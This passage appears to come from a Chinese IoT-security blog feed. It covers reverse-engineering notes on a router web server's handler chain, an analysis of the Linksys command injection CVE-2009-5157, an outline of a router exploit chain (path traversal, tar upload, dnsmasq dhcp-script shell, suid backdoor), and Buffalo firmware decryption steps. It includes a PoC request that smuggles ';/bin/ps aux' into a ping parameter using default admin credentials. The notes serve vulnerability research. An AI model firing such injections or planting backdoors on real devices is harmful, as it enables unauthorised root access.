<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">gozila_cgi</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">char</span> *a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    v13 = (struc_gozila_action *)handle_gozila_action(v7, v8);</span><br><span class="line">      v17 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>))v13-&gt;func;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        v17(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>查看handle_gozila_action的xref to（view、graphs、xrefs to），最终找到call_apply_cgi（自己重命名的），也可以逐层的交叉引用。（最开始call_apply_cgi是没有data的引用的，后续alt+b、快捷键O才可以的</li>
</ol>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-18-085810.png" alt></p>
<ol start="3">
<li>call_apply_cgi交叉引用为空，可能跟create_dir一个情况：alt+b搜索其地址0x417544</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">.data:10001574                 .byte    0</span><br><span class="line">.data:10001575                 .byte 0x41  <span class="comment"># A</span></span><br><span class="line">.data:10001576                 .byte 0x75  <span class="comment"># u</span></span><br><span class="line">.data:10001577                 .byte 0x44  <span class="comment"># D</span></span><br><span class="line"><span class="comment"># 快捷键O之后</span></span><br><span class="line">.data:10001574                 .word call_apply_cgi</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>找到起始处</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">.data:10001500                 .globl mime_handlers</span><br><span class="line">.data:10001500 mime_handlers:  .word aAsp_0             <span class="comment"># DATA XREF: LOAD:00403938↑o</span></span><br><span class="line">.data:10001500                                          <span class="comment"># sub_40B080+11D8↑o ...</span></span><br><span class="line">.data:10001500                                          <span class="comment"># "**.asp"</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>找到其在text中的数据交叉引用<code>Up    o    sub_40B080+11D8    la      $s2, mime_handlers</code>（call形式的为代码交叉引用）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40B080</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v76 = &amp;mime_handlers;<span class="comment">// 结构体数组首地址</span></span><br><span class="line">  v77 = mime_handlers;<span class="comment">//结构体数组的第一个结构体的第一个成员</span></span><br><span class="line">  <span class="comment">// 从结构体数组中找到某结构体</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123; <span class="comment">//应该是字符串匹配功能，因此2参数都是字符串类型</span></span><br><span class="line">    <span class="comment">//可知结构体的第一个成员为字符串类型，由.data中结构体数组中也可知（见1</span></span><br><span class="line">    <span class="comment">//第一个为uri，因此dword_10009B6C也是（见1</span></span><br><span class="line">    result = match(v77, dword_10009B6C);</span><br><span class="line">    <span class="comment">// 若匹配到结果则退出循环</span></span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v76 += <span class="number">3</span>;<span class="comment">//指针+3，因此结构体的成员数为3</span></span><br><span class="line">    v77 = *v76;<span class="comment">//取第一个成员</span></span><br><span class="line">    <span class="comment">//若第一个成员为0则退出，表示结构体数组以0结尾（见2</span></span><br><span class="line">    <span class="keyword">if</span> ( !*v76 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1 结构体的第一个成员为字符串，而且应该是uri</span></span><br><span class="line">.data:<span class="number">10001500</span> mime_handlers:  .word aAsp_0             # DATA XREF: LOAD:<span class="number">00403938</span>↑o</span><br><span class="line">.data:<span class="number">10001500</span>                                          # sub_40B080+<span class="number">11</span>D8↑o ...</span><br><span class="line">.data:<span class="number">10001500</span>                                          # <span class="string">"**.asp"</span></span><br><span class="line">.data:<span class="number">10001504</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">10001508</span>                 .word do_ej</span><br><span class="line">.data:<span class="number">1000150</span>C                 .word aSysinfoHtm        # <span class="string">"SysInfo.htm*"</span></span><br><span class="line">.data:<span class="number">10001510</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">10001514</span>                 .word do_ej</span><br><span class="line">.data:<span class="number">10001518</span>                 .word aSysinfo1Htm       # <span class="string">"SysInfo1.htm*"</span></span><br><span class="line">.data:<span class="number">1000151</span>C                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">10001520</span>                 .word do_ej</span><br><span class="line">.data:<span class="number">10001524</span>                 .word aWlaninfoHtm       # <span class="string">"wlaninfo.htm*"</span></span><br><span class="line">.data:<span class="number">10001528</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">1000152</span>C                 .word do_ej</span><br><span class="line"><span class="comment">// 2 结构体数组以0结尾</span></span><br><span class="line">.data:<span class="number">100015E4</span>                 .word aDiag              # <span class="string">"diag"</span></span><br><span class="line">.data:<span class="number">100015E8</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015</span>EC                 .word do_ej</span><br><span class="line">.data:<span class="number">100015F</span>0                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015F</span>4                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015F</span>8                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015F</span>C                 .globl apply_actions</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>继续分析sub_40B080函数，看取得v76之后</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40B080</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 判断是否存在</span></span><br><span class="line">  <span class="keyword">if</span> ( v76[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 先看session是否失效，可见此漏洞是需要认证的</span></span><br><span class="line">    v99 = (<span class="keyword">const</span> <span class="keyword">char</span> *)nvram_get(<span class="string">"close_session"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v99 || !<span class="built_in">strcmp</span>(v99, <span class="string">"1"</span>) || hnap_request == <span class="number">1</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v213 - <span class="number">4</span>) &gt;= <span class="number">3</span> )</span><br><span class="line">      <span class="comment">// 函数调用，可见第二个成员为函数指针</span></span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))v76[<span class="number">1</span>])(dword_10009B6C, conn_fp, v214, dword_10009BA8);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 判断是否存在</span></span><br><span class="line">  <span class="keyword">if</span> ( !v76[<span class="number">2</span>] )</span><br><span class="line">   <span class="keyword">return</span> sub_408D34();</span><br><span class="line">  v98 = (<span class="keyword">const</span> <span class="keyword">char</span> *)nvram_get(<span class="string">"close_session"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v98 || !<span class="built_in">strcmp</span>(v98, <span class="string">"1"</span>) || hnap_request == <span class="number">1</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v213 - <span class="number">4</span>) &gt;= <span class="number">3</span> || post != <span class="number">1</span> )</span><br><span class="line"> 	&#123;</span><br><span class="line">    <span class="comment">// 函数调用，可见第三个成员也为函数指针</span></span><br><span class="line">    <span class="comment">// 参数1为uri，参数2为socket连接</span></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">int</span>))v76[<span class="number">2</span>])(dword_10009B6C, conn_fp);</span><br><span class="line">    <span class="keyword">return</span> sub_408D34();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="7">
<li>综上所述，结构体的第一个成员为字符串形式的uri，2和3皆是函数指针，选中数据右键，create structure from selection，创建如下结构体</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">00000000 struc_mime_handlers struc  <span class="comment"># (sizeof=0xC, mappedto_24)</span></span><br><span class="line">00000000                                          <span class="comment"># XREF: .data:10001524/r</span></span><br><span class="line">00000000 aUri:           .word ?                  <span class="comment"># offset (00000000)</span></span><br><span class="line">00000004 func1:          .word ?</span><br><span class="line">00000008 func2:          .word ?                  <span class="comment"># offset (00000000)</span></span><br><span class="line">0000000C struc_mime_handlers ends</span><br></pre></td></tr></table></figure>
<ol start="8">
<li><p>sub_40B080重命名为my_handle_req，通过my_handle_req调用call_apply_cgi函数，而其又被main调用，mian被ftext中的_uClibc_main调用，而查看exports发现ftext为entry point。</p>
</li>
<li><p>因此漏洞函数create_dir的完整调用流程如下：</p>
<ol>
<li>入口点ftext</li>
<li>_uClibc_main</li>
<li>main</li>
<li>my_handle_req</li>
<li>call_apply_cgi（指针形式被调用</li>
<li>apply_cgi</li>
<li>gozila_cgi</li>
<li>handle_gozila_action</li>
<li>create_dir（指针形式被调用</li>
</ol>
</li>
</ol>
<h3 id="怎么发现"><a href="#怎么发现" class="headerlink" title="怎么发现"></a>怎么发现</h3><h4 id="py脚本初步过滤"><a href="#py脚本初步过滤" class="headerlink" title="py脚本初步过滤"></a>py脚本初步过滤</h4><ol>
<li>触发漏洞的是create_dir中的字符串拼接函数sprintf，其原型 <code>sprintf(str, format, arg1, arg2...)</code> </li>
<li>要产生漏洞，参数要满足：<ol>
<li>str的空间大小是个定值（一般都满足），且不能太小（太小也没法利用）</li>
<li>format中有%s，如果%d，则只取4个字节，而%s会一直取直到00（对应的用户可控的arg</li>
<li>arg不能是定值，且用户能控制</li>
</ol>
</li>
<li>编写ida脚本来进行初步过滤，然后人工看</li>
<li>依据format过滤<ol>
<li>对sprintf交叉引用，p类型的，共209（py脚本不限制%s个数，也是209，二者对应</li>
<li>format中存在%s的，共113个</li>
</ol>
</li>
<li>依据str过滤：情况有点多，不如直接看</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 几种对a0赋值的情况</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 调用前赋值、调用后赋值（流水线效应</span></span><br><span class="line"><span class="comment"># 1 先来自s0，又来自栈地址</span></span><br><span class="line">addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, 0x70+var_28</span><br><span class="line">move    <span class="variable">$a0</span>, <span class="variable">$s0</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line"><span class="comment"># 2 s7来自其他block，是跳过来的</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line">move    <span class="variable">$a0</span>, <span class="variable">$s7</span></span><br><span class="line"><span class="comment"># 3 直接来自栈地址</span></span><br><span class="line">addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, 0x1C0+var_188</span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line"><span class="comment"># 4 来自v0，而又来自其他函数返回值</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; strlen</span><br><span class="line">addu    <span class="variable">$a0</span>, <span class="variable">$s3</span>, <span class="variable">$v0</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line"><span class="comment"># 5 待发现</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li><p>依据arg过滤：</p>
<ol>
<li>具体有几个arg取决于format中%的个数（而非%s的个数），超过2个（还有2个是str和format），就通过栈传递而非寄存器了</li>
<li>主要看%s对应的是不是写死的字符串，如果全部都是则排除</li>
<li>关键点是看用户能够控制输入，脚本难以实现，故直接看吧</li>
</ol>
</li>
<li><p>综上，通过format的过滤209变为了113，缩小了范围，而通过str和arg的过滤事倍功半，还是直接看</p>
</li>
</ol>
<h4 id="先找用户能访问的"><a href="#先找用户能访问的" class="headerlink" title="先找用户能访问的"></a>先找用户能访问的</h4><ul>
<li>找用户能访问的地方，再过滤一波</li>
<li>需要分析整个二进制的架构，先积攒部分的经验，再看整体//here</li>
</ul>
<h2 id="02-CVE-2009-5157"><a href="#02-CVE-2009-5157" class="headerlink" title="02-CVE-2009-5157"></a>02-CVE-2009-5157</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://www.securityfocus.com/archive/1/503934</span></span><br><span class="line">When logged into web management console, it is possible to execute commands as root</span><br><span class="line"><span class="comment"># 需经过认证，命令注入</span></span><br></pre></td></tr></table></figure>
<ul>
<li>文件系统提取</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 固件下载（三方，没有V1.00.10，只有v1.00.19，凑活用</span></span><br><span class="line">https://sourceforge.net/projects/officiallinksysfirmware/</span><br><span class="line"><span class="comment"># 文件系统提取</span></span><br><span class="line">解压后，有很多其他工具，如buildroot</span><br><span class="line">有一个jffs2.bin，提取：https://github.com/sviehb/jefferson</span><br><span class="line">最终放弃此，找不到http程序，也没找到setup.cgi</span><br><span class="line"></span><br><span class="line"><span class="comment"># linksys官网找到以往版本下载</span></span><br><span class="line">https://www.linksys.com/gb/support-article?articleNum=208638</span><br></pre></td></tr></table></figure>
<ul>
<li>有多个setup.cgi，但最终都指向/usr/sbin/setup.cgi</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/squashfs-root$ find . -name <span class="string">"setup.cgi"</span></span><br><span class="line">./www.eng/setup.cgi</span><br><span class="line">./www.ar/setup.cgi</span><br><span class="line">./etc/setup.cgi</span><br><span class="line">./usr/sbin/setup.cgi</span><br><span class="line">./usr/etc/setup.cgi</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">/squashfs-root$ find . -name <span class="string">"setup.cgi"</span> | xargs ls -l</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     18 Aug  1  2008 ./etc/setup.cgi -&gt; /tmp/etc/setup.cgi</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     19 Aug  1  2008 ./usr/etc/setup.cgi -&gt; /usr/sbin/setup.cgi</span><br><span class="line">-rwxr-xr-x 1 lxl lxl 264372 Aug  1  2008 ./usr/sbin/setup.cgi</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     14 Aug  1  2008 ./www.ar/setup.cgi -&gt; /etc/setup.cgi</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     14 Aug  1  2008 ./www.eng/setup.cgi -&gt; /etc/setup.cgi</span><br></pre></td></tr></table></figure>
<h3 id="如何触发"><a href="#如何触发" class="headerlink" title="如何触发"></a>如何触发</h3><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># setup.cgi后的参数可控，c4_ping_ipaddr是漏洞点</span></span><br><span class="line">GET /setup.cgi?ping_ipaddr1=1&amp;ping_ipaddr2=1&amp;ping_ipaddr3=1&amp;ping_ipaddr4=1&amp;p</span><br><span class="line">ing_size=60&amp;ping_number=1&amp;ping_interval=1000&amp;ping_timeout=5000&amp;start=Sta</span><br><span class="line">rt+Test&amp;todo=ping_test&amp;this_file=Diagnostics.htm&amp;next_file=Diagnostics.h</span><br><span class="line">tm&amp;c4_ping_ipaddr=1.1.1.1;/bin/ps aux&amp;message= HTTP/1.1</span><br><span class="line"><span class="comment"># 需经过认证</span></span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure>
<h4 id="漏洞函数sub-A95C"><a href="#漏洞函数sub-A95C" class="headerlink" title="漏洞函数sub_A95C"></a>漏洞函数sub_A95C</h4><ul>
<li>漏洞函数sub_A95C（rename为my_vuln_func），sprintf拼接用户输入，随后system执行</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串”c4_ping_ipaddr“交叉引用找到</span></span><br><span class="line">int __fastcall my_vuln_func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># 根据上下文可猜测出：a1为url字符串，而sub_26D9C可获取指定键的值并返回（rename为my_get_value</span></span><br><span class="line">  v8 = (const char *)my_get_value(a1, <span class="string">"c4_ping_ipaddr"</span>);</span><br><span class="line">	<span class="comment"># 字符串拼接到s</span></span><br><span class="line">  sprintf(s, <span class="string">"/usr/sbin/pingmultilang -s %s -c %s -i %d.%d -W %d.%d %s"</span>, v2, v3, v14, v15, v16, v9, v8);</span><br><span class="line">  <span class="comment"># 执行s命令字符串，用户可控输入</span></span><br><span class="line">  system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="如何调用漏洞函数-1"><a href="#如何调用漏洞函数-1" class="headerlink" title="如何调用漏洞函数"></a>如何调用漏洞函数</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># my_func_vuln的xrefs，只找到data中的，是结构体数组，找到起首地址</span></span><br><span class="line">.data:0004A9EC off_4A9EC       DCD aSave               ; DATA XREF: my_call_vuln_func+14↑o</span><br><span class="line">.data:0004A9EC                                         ; my_call_vuln_func:loc_D61C↑r ...</span><br><span class="line">.data:0004A9EC                                         ; <span class="string">"save"</span></span><br><span class="line">.data:0004A9F0                 DCD sub_CA40</span><br><span class="line">...</span><br><span class="line">.data:0004AA1C                 DCD aPingTest           ; <span class="string">"ping_test"</span><span class="comment"># 字符串</span></span><br><span class="line">.data:0004AA20                 DCD my_vuln_func	<span class="comment"># 函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结构体数组首地址xrefs</span></span><br><span class="line">int __fastcall my_call_vuln_func(int a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">  my_get_value(a1, (int)<span class="string">"this_file"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;off_4A9EC; *i; i += 2 )<span class="comment"># 每次+2，即结构体2个成员</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !strcmp(a2, *i) ) <span class="comment"># 对比第一个成员和a2，即字符串</span></span><br><span class="line">      <span class="built_in">return</span> ((int (__fastcall *)(int))i[1])(a1);<span class="comment"># 调用i[1]，即第2个成员为函数，其参数为a1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># my_call_vuln_func的xrefs</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">   		<span class="comment"># poc中，todo=ping_test</span></span><br><span class="line">      v17 = (const char *)my_get_value(v15, (int)<span class="string">"todo"</span>);<span class="comment"># 推出v15为uri</span></span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">      &#123;</span><br><span class="line">        my_call_vuln_func(v15, v17);<span class="comment"># 传参：uri、“ping_test”</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>综上，完整流程<ol>
<li>_start</li>
<li>_uClibc_main</li>
<li>main</li>
<li>my_call_vuln_func</li>
<li>my_vuln_func（指针形式被调用</li>
</ol>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>system+spirntf：命令注入</li>
<li>sprintf：能造成溢出，为何不是缓冲区溢出呢？或许是my_get_value中做了大小的限制</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">int __fastcall my_vuln_func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (const char *)my_get_value(a1, (int)<span class="string">"c4_ping_ipaddr"</span>);</span><br><span class="line">  sprintf(s, <span class="string">"/usr/sbin/pingmultilang -s %s -c %s -i %d.%d -W %d.%d %s"</span>, v2, v3, v14, v15, v16, v9, v8);</span><br><span class="line">  system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="03-here"><a href="#03-here" class="headerlink" title="03-//here"></a>03-//here</h2><p>看到了Linksys WVBR0 安全漏洞</p>
<p><a href="https://www.anquanke.com/vul（搜索linksys" target="_blank" rel="noopener">https://www.anquanke.com/vul（搜索linksys</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>补丁对比</tag>
      </tags>
  </entry>
  <entry>
    <title>路由器中的逻辑漏洞</title>
    <url>/2021/08/21/iot/%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%AD%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="路由器中的逻辑漏洞"><a href="#路由器中的逻辑漏洞" class="headerlink" title="路由器中的逻辑漏洞"></a>路由器中的逻辑漏洞</h1><ul>
<li>概述：三个逻辑漏洞-目录遍历+文件上传+提权、nginx配置文件、备份恢复功能、Dnsmasq程序、tar+grep</li>
<li>目录遍历：配置文件nginx.conf，location-alias字段</li>
<li>文件上传<ul>
<li>漏洞点：从备份文件（压缩包）中恢复配置</li>
<li>逻辑问题：尽管压缩包未通过校验，但解压后的配置文件未删除</li>
<li>因为tar的P参数，可解压在/tmp下任意目录下，如/tmp/test/test.des</li>
<li><code>grep</code> 在模式匹配时使用 <code>.</code> 可以代替任意字符，因此配置“.des”时，只需包含des即可</li>
</ul>
</li>
<li>获取shell<ul>
<li>ps查看存在dnsmasq进程，ps w | grep dnsmasq，得知其配置文件为 -C /var/etc/dnsmasq.conf.cfg01411c</li>
<li>配置文件中，配置所在目录conf-dir=/tmp/dnsmasq.d（注意，这两种配置应该不是一个概念）</li>
<li>构造dnsmasq 配置文件（设置dhcp-script脚本）并上传至tmp/dnsmasq.d下（通过tar的P参数）</li>
<li>重启dnsmasq进程，使其加载刚上传的配置文件</li>
<li>通过tftp来触发触发 dhcp-script</li>
</ul>
</li>
<li>权限提升<ul>
<li>对于 <code>root</code> 用户而言，使用 <code>tar</code> 解压文件时，默认会保留文件的文件所有者，文件权限等信息</li>
<li>可以通过上传具有 <code>suid</code> 权限的后门程序到路由器文件系统中，低权限的攻击者通过执行后门来获取高权限的 shell</li>
<li>mount查看标志位： <code>/tmp</code> 挂载的标志位为 <code>nosuid</code>，所以在 <code>/tmp</code> 下运行有 <code>suid</code> 权限的 binary 并不会生效，但是其子目录下可以，如/tmp/spool/cron/crontabs</li>
</ul>
</li>
<li>Dnsmasq<ul>
<li>轻量级DNS转发和DHCP、TFTP服务器</li>
<li>重启 ：基本所有更改网络状态的操作都可，比如开/关 ipv6</li>
<li>dhcp-script：通过 tftp 传输文件来触发</li>
<li>tftp：dnsmasq 的 tftp 只能读取文件，不能上传文件</li>
</ul>
</li>
<li>其它<ul>
<li>使用 pwntools 编写的汇编程序，调用busybox</li>
<li><code>/etc/crontabs</code> 下的定时任务脚本对文件名有要求，需和用户名一致才会被 crontab 视为合法的定时任务配置，如文件名必须为 <code>nobody</code> 才可以以 <code>nobody</code> 的身份执行命令</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://mp.weixin.qq.com/s/ykrkcPXNyLjxh67GSJLOEA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ykrkcPXNyLjxh67GSJLOEA</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>buffalo固件解密工具</title>
    <url>/2021/08/21/iot/buffalo%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="buffalo固件解密工具"><a href="#buffalo固件解密工具" class="headerlink" title="buffalo固件解密工具"></a>buffalo固件解密工具</h2><ul>
<li>源码：<a href="https://gitlab.nic.cz/turris/openwrt/-/tree/test/tools/firmware-utils/src" target="_blank" rel="noopener">https://gitlab.nic.cz/turris/openwrt/-/tree/test/tools/firmware-utils/src</a></li>
<li>步骤：<a href="https://forum.archive.openwrt.org/viewtopic.php?id=48520" target="_blank" rel="noopener">https://forum.archive.openwrt.org/viewtopic.php?id=48520</a><ul>
<li>Get a copy of the Buffalo firmware. I got mine from <a href="http://www.buffalotech.com/support-and-downloads/download/wzr600dhp-pro-v24sp2-20180-download.zip" target="_blank" rel="noopener">here</a>.</li>
<li>Unpack the .zip file. There will be a big binary .enc file in it. This is the encrypted firmware.</li>
<li>Strip off the first section of the encrypted firmware – up to the second “start” string. In my firmware, the first section was 208 bytes, so this did it: <em>dd if=encrypted-fw.enc of=crypted-fw.enc bs=208 skip=1</em></li>
<li>Find the Buffalo encrypted-firmware decrypting code in the OpenWRT source tree. It’s somewhere under …/tools/firmware-utils/src/…</li>
<li>Copy buffalo-enc.c, buffalo-lib.c and buffalo-lib.h somewhere safe, like /tmp</li>
<li>Compile the decryptor: gcc -o bufdec buffalo-enc.c buffalo-lib.c</li>
<li>Use the decryptor to decrypt the beheaded, encrypted firmware: ./bufdec -d -i crypted.enc -o buffalo-fw.img</li>
</ul>
</li>
<li>实例<ul>
<li>：./buffalo-enc -d -i wsr2533dhp_jp_106 -o wsr2533dhp_jp_106_decrypted.bin -O 200 -l</li>
<li>注意：要手动去掉第一个头（第二个start前）或者-O指定偏移（二者是相同效果）、加-l选项</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://modemizer.wordpress.com/2015/08/05/restoring-the-original-buffalo-firmware-on-the-wbmr-hp-g300h/" target="_blank" rel="noopener">https://modemizer.wordpress.com/2015/08/05/restoring-the-original-buffalo-firmware-on-the-wbmr-hp-g300h/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>固件解密</tag>
      </tags>
  </entry>
  <entry>
    <title>路由器中的CGI漏洞</title>
    <url>/2021/08/19/iot/%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%AD%E7%9A%84CGI%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="路由器中的CGI漏洞"><a href="#路由器中的CGI漏洞" class="headerlink" title="路由器中的CGI漏洞"></a>路由器中的CGI漏洞</h2><ul>
<li>概要：boa、uhttpd</li>
<li>实现动态Web页面有4种技术：CGI、ASP、PHP、JSP</li>
<li><p>CGI-Common Gateway Interface</p>
<ul>
<li>Web服务器和运行其上的应用程序“交流”的一种约定</li>
<li>不是一门编程语言，是网页表单和程序之间通信协议</li>
<li><p>可以用任何语言写CGI脚本，只要语言能接收输入输出信息、读取环境变量</p>
</li>
<li><p>CGI脚本做的事情：读取用户表单信息、处理这些信息、输出即返回html响应</p>
</li>
</ul>
</li>
<li>IOT设备WebServer<ul>
<li>主要有三个：httpd、thttpd、Boa</li>
<li>httpd：最简单、功能最弱、不支持认证、不支持CGI</li>
<li>Thttpd/Boa：支持认证、CGI等，功能较全</li>
</ul>
</li>
<li>Boa<ul>
<li>单任务的http服务器、源代码开放、性能高</li>
<li>单任务：不会为每个传入的连接 fork，也不会 fork自身副本来处理多个连接</li>
<li>多路复用HTTP 连接，只为 CGI 程序、自动目录生成、自动文件压缩进行 fork</li>
</ul>
</li>
<li>boa源码<ol>
<li>process_option_Iine()将头部信息填写到request结构中，完成这些环境变量的设置</li>
<li>process_header_end()对用户进行验证，若通过则下一步</li>
<li>判断request结构中的is_cgi，非0则CGI程序-init_cgi()、为0则静态页面-init_get()</li>
</ol>
</li>
<li>init_cgi<ul>
<li>translate_uri：解析请求的虚拟路径</li>
<li>create_common_env/complete_env：设置CGI环境变量</li>
<li>init_script_alias：解析ScriptAlias请求，设置请求cgi类型，查看文件是否存在及具有权限</li>
<li>execve执行程序</li>
</ul>
</li>
<li><p>uhttpd</p>
<ul>
<li><p>OpenWrt默认的HTTP服务器，配合LuCI Web来管理OpenWrt设备</p>
</li>
<li><p>luci：以cgi方式被web服务器调用、语言采用lua、支持CGI/Lua/UBUS处理请求</p>
</li>
<li><p>IoT设备使用OpenWrt：结合uhttpd、使用LuCI框架、编写lua脚本</p>
</li>
</ul>
</li>
<li>uhttpd源码<ul>
<li>uh_handle_request：解析请求头</li>
<li>dispatch_find：根据url找到dispatch_handler</li>
<li>cgi_prefix：默认值/cgi-bin，在/etc/config/uhttpd配置文件中</li>
<li>main中默认添加了cgi_dispatch，即dispatch_handler结构体变量，有3个成员，script、check_path、handle_request</li>
<li>当请求的url通过<code>check_cgi_path</code>函数（check_path）校验，则会调用<code>cgi_handle_request</code>函数（handle_request）</li>
<li>cgi_handle_request：通过uh_create_process回调cgi_main、cgi_main中execl执行CGI程序</li>
</ul>
</li>
<li>todo：未结合实例，要详细看</li>
<li>常见嵌入式Web服务器CGI处理功能简要分析：<a href="https://larry.ngrep.me/2020/02/03/iot-web-server-cgi-handler-analysis/" target="_blank" rel="noopener">https://larry.ngrep.me/2020/02/03/iot-web-server-cgi-handler-analysis/</a></li>
</ul>
<blockquote>
<p>参考：<a href="https://mp.weixin.qq.com/s/1Fqb0j_gsm-eHF1uOwVgBw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1Fqb0j_gsm-eHF1uOwVgBw</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>iot安全实用技巧</title>
